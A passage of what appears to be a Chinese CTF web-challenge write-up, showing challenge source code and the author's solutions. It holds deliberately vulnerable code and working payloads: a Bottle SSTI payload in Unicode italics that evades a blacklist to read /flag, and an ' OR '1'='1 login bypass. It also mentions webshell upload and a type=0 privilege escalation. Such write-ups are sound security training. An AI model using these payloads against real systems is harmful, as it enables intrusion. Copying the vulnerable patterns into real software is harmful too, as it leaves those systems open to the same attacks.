class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;⚡&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;快速处理&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;高效处理小于1MB的ZIP文件，快速获取内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;上传页面&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;上传ZIP文件&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-primary text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;📤 上传ZIP文件&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;upload-form&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;fileInput&quot; class=&quot;form-label&quot;&gt;选择ZIP文件（最大1MB）&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input class=&quot;form-control&quot; type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;.zip&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;div class=&quot;form-text&quot;&gt;仅支持.zip格式的文件，且文件大小不超过1MB&lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;</span></span><br><span class="line"><span class="string">                                📤 上传文件</span></span><br><span class="line"><span class="string">                            &lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        ↩️ 返回首页</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理文件上传&quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;请上传有效的ZIP文件&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;文件大小超过限制(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;处理ZIP文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;上传成功&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header bg-success text-white&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4 class=&quot;mb-0&quot;&gt;✅ 上传成功!&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">                            ✅ 文件已成功上传并解压</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        &lt;h5&gt;文件列表:&lt;/h5&gt;</span></span><br><span class="line"><span class="string">                        &lt;ul class=&quot;list-group mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            % for file in files:</span></span><br><span class="line"><span class="string">                            &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;span&gt;📄 &#123;&#123;file&#125;&#125;&lt;/span&gt;</span></span><br><span class="line"><span class="string">                                &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;file&#125;&#125;&quot; class=&quot;btn btn-sm btn-outline-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                    查看</span></span><br><span class="line"><span class="string">                                &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;/li&gt;</span></span><br><span class="line"><span class="string">                            % end</span></span><br><span class="line"><span class="string">                        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        % if files:</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;d-grid gap-2&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/view/&#123;&#123;dir_hash&#125;&#125;/&#123;&#123;files[0]&#125;&#125;&quot; class=&quot;btn btn-primary&quot;&gt;</span></span><br><span class="line"><span class="string">                                👀 查看第一个文件</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        % end</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div class=&quot;text-center mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/upload&quot; class=&quot;btn btn-outline-primary me-2&quot;&gt;</span></span><br><span class="line"><span class="string">                        ➕ 上传另一个文件</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                    &lt;a href=&quot;/&quot; class=&quot;btn btn-outline-secondary&quot;&gt;</span></span><br><span class="line"><span class="string">                        🏠 返回首页</span></span><br><span class="line"><span class="string">                    &lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件不存在&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请求的路径不是文件&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;非法访问尝试&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法读取文件内容（可能是二进制文件）&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件内容包含不允许的关键词&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;渲染错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;静态文件服务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;讨厌啦不是说好只看看不摸的吗&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;不要透进来啊啊啊啊&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#原神，启动!</span></span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>bottle框架下的ssti斜体字直接绕过</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;ℴ𝓅ℯ𝓃(&#x27;/flag&#x27;).𝓇ℯa𝒹()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="flag到底在哪"><a href="#flag到底在哪" class="headerlink" title="flag到底在哪"></a>flag到底在哪</h2><p>&#x2F;robots.txt得到&#x2F;admin&#x2F;login.php，然后是一个登录框</p><p><img src="/../images/achieve/2025/11/image-20251202214820781.png" alt="image-20251202214820781"></p><p>这里有个hint，还以为是弱口令，没跑出来！sql注入也测不出来！后面放了个hint</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小蓝鲨说账户必须是admin哦，不要在用户名上做尝试啦! 如果要使用逻辑运算符请使用大写</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果已经登录，直接跳转到 upload.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: upload.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$password</span>, <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /upload.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;❌ 用户名或密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>自己看吧，我也不好说什么了，一个登录框没有带入数据库，个人感觉不是很好这里，估计是想考万能密码</p><p><code>SELECT * FROM users WHERE username = &#39;admin&#39; AND password = &#39;[用户输入的密码]&#39;</code></p><p>然后拼接上去，但是它这考的不太行，万能密码又不是只能那样用，如果sql语句长这样我肯定可以在用户那里就能用啊！登录上去就是无任何过滤的webshell上传，之后拿flag就行！</p><h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h2><p>抓包具体那个包自己去试一试，反正这是信息收集的一部分，我也懒的再去做一遍了，然后改了个参数type&#x3D;0，越权到管理员，拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">database=&#123;&#125;</span><br><span class="line">data_index=<span class="number">0</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/registerV2&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">registerV2</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password2=request.form[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> password!=password2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;前后密码不一致，请确认后重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/register&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> data_index</span><br><span class="line">        data_index+=<span class="number">1</span></span><br><span class="line">        database[data_index]=username</span><br><span class="line">        database[username]=password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user_dashboard&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/272e1739b89da32e983970ece1a086bd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A272e1739b89da32e983970ece1a086bd</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/name&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;username&#x27;</span>:user&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 